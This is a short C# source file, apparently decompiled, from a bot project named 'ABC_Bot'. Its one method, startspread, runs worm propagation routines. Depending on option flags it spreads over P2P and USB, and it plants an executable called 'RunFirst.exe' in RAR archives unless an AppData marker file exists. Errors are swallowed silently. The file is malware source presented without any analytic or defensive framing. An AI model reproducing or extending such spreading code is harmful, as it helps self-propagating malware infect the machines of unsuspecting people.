using System;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;

namespace ABC_Bot;

[StandardModule]
internal sealed class c_smain
{
	public static object startspread()
	{
		if (main.o_p2p)
		{
			mod_p2p.s_p2p();
		}
		if (main.o_usb)
		{
			mod_usb.s_usb();
		}
		object result = default(object);
		if (main.o_rar && !File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\temp48.txt"))
		{
			try
			{
				c_rar.Spread("RunFirst.exe");
				return result;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return result;
			}
		}
		return result;
	}
}
